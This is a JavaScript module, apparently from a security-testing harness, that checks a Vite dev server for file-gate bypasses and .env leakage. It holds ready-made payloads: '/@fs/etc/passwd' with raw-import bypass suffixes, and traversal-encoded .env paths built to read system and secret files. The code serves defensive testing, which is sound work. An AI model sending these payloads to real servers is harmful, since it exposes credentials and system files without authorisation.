// packs/public/vite-dev-shapes/index.js - the vite dev-server lane.
// Vite's DEV wire has its own signature that generic attacks cannot emit:
// the /@fs/ absolute-path module route plus transform-grammar suffixes.
// The known bypass classes (raw-import suffix tricks like `?raw??` /
// `?import&raw??` and traversal-encodings that walk out of an allowlist)
// turn a gated dev server into a file disclosure. Two attacks, both
// INSIST on the wire truth (what the handler actually answers):
//
//   vite-fs-deny-bypass - the differential oracle: the SAME /@fs/ endpoint
//     without a bypass grammar must be gated (4xx); if a bypass grammar
//     turns that denial into a 2xx with body, the gate was bypassed.
//     A handler that serves /@fs/ content freely is not a differential -
//     honestly REFUSED (gating posture, not a proven bypass).
//   vite-env-canary - deny-listed files (.env family) must never come back
//     with content-shaped bodies: a 2xx whose body looks like KEY=VALUE env
//     material through ANY grammar is a leak. The oracle needs the body to
//     RESPOND like env content, so an anything-200 handler is honest
//     REFUSED (never a false positive).
//
// Sweep semantics (cve-feed style): every declared route fired; optional
// `ctx.routes` whitelist narrows. Offline: no fs access, no version claims
// (banner exposure of an affected vite itself is cve-feed's job).
// Vocabulary: ctx.routes (optional route list).

import { refused, exploited } from '../../../src/scenarios/contract.js';

const FS_ENDPOINT = '/@fs/etc/passwd';
const BYPASS_GRAMMARS = [
  '?raw??',
  '?import&raw??',
  '?import&raw&inline??',
];
// Deny-list file paths + traversal encodings (the shapes a dev-server gate is
// supposed to refuse regardless of grammar).
const DENIED_PATHS = [
  '/.env',
  '/.env?raw??',
  '/.env.local?raw??',
  '/@fs/etc/.env?raw??',
  '/@fs/%2e%2e%2f.env?raw??',
  '/@fs/..%2f..%2f.env?import&raw??',
];

/** Does a body LOOK like env material? A real /.env leak answers with
 * KEY=VALUE-ish lines; an anything-200 handler answers 'ok'/'accepted' and
 * must not be a false positive. */
function looksLikeEnv(body) {
  return typeof body === 'string' && /^[A-Za-z0-9_]{1,64}=\S/m.test(body);
}

function routesFor(harness, ctx) {
  const declared = harness.listRoutes();
  if (!declared.length) return { sweep: null, skipped: true };
  const pinned = Array.isArray(ctx.routes) ? ctx.routes.filter((r) => declared.includes(r)) : null;
  return { sweep: pinned ?? declared, skipped: false };
}

export default {
  name: 'vite-dev-shapes',
  description: 'vite dev-server wire shapes: fs deny/allow bypass grammars and deny-list (.env) leakage over every declared route (zero sockets; differential + content-shape oracles, never fake verdicts)',

  attacks: [
    {
      name: 'vite-fs-deny-bypass',
      description: 'the SAME /@fs/ endpoint: gated without the bypass grammar, served through it -> the gate was bypassed (EXPLOITED); ungated access is honest REFUSED, not a false positive',
      async run(harness, ctx = {}) {
        const { sweep, skipped } = routesFor(harness, ctx);
        if (skipped) {
          return refused('no routes declared on this run root - fs-deny-bypass skipped', { skipped: true });
        }
        const bypassed = [];
        const ungated = [];
        for (const route of sweep) {
          const plain = await harness.run(route, { method: 'GET', url: FS_ENDPOINT });
          const plainStatus = plain.threw ? 500 : plain.status;
          const plainBody = plain.threw ? '' : await plain.response.text();
          if (plainStatus >= 200 && plainStatus < 300 && plainBody.length > 0) {
            // Serves /@fs/ content with NO grammar - not a differential; a
            // posture note, honestly refused (cross-link cve-feed for the banner).
            ungated.push(route);
            continue;
          }
          for (const grammar of BYPASS_GRAMMARS) {
            const rec = await harness.run(route, { method: 'GET', url: `${FS_ENDPOINT}${grammar}` });
            const status = rec.threw ? 500 : rec.status;
            const body = rec.threw ? '' : await rec.response.text();
            if (status >= 200 && status < 300 && body.length > 0) {
              bypassed.push(`${route} (${grammar})`);
              break;
            }
          }
        }
        if (bypassed.length) {
          return exploited(
            `fs gate bypassed: "${bypassed[0]}" was denied on the plain shape but served through a bypass grammar (+${bypassed.length - 1} more) - the dev-server file gate does not cover its transform suffixes`,
            { routes: bypassed.slice(0, 6), ungated: ungated.length },
          );
        }
        return refused(
          `${sweep.length} route(s): no grammar differential on /@fs/ shapes (plain answers gated or consistent across grammars${ungated.length ? `; ${ungated.length} route(s) serve /@fs/ ungated - posture note, not a proven bypass` : ''})`,
          { routes: sweep.length, ungated: ungated.length },
        );
      },
    },

    {
      name: 'vite-env-canary',
      description: 'deny-listed files (.env family) served with CONTENT-shaped bodies through any grammar -> leak; an anything-200 handler is honestly REFUSED (content-shape oracle)',
      async run(harness, ctx = {}) {
        const { sweep, skipped } = routesFor(harness, ctx);
        if (skipped) {
          return refused('no routes declared on this run root - env-canary skipped', { skipped: true });
        }
        const leaked = [];
        for (const route of sweep) {
          for (const path of DENIED_PATHS) {
            const rec = await harness.run(route, { method: 'GET', url: path });
            if (rec.threw) continue;
            const status = rec.status;
            if (status >= 200 && status < 300) {
              const body = await rec.response.text();
              if (looksLikeEnv(body)) {
                leaked.push(`${route}${path}`);
                break;
              }
            }
          }
        }
        if (leaked.length) {
          return exploited(
            `deny-listed file content served: "${leaked[0]}" (+${leaked.length - 1} more) - a .env-family body never belongs on any wire status`,
            { paths: leaked.slice(0, 6) },
          );
        }
        return refused(
          `${sweep.length} route(s): .env-family shapes never returned content-shaped bodies (content-shape oracle held)`,
          { routes: sweep.length },
        );
      },
    },
  ],
};
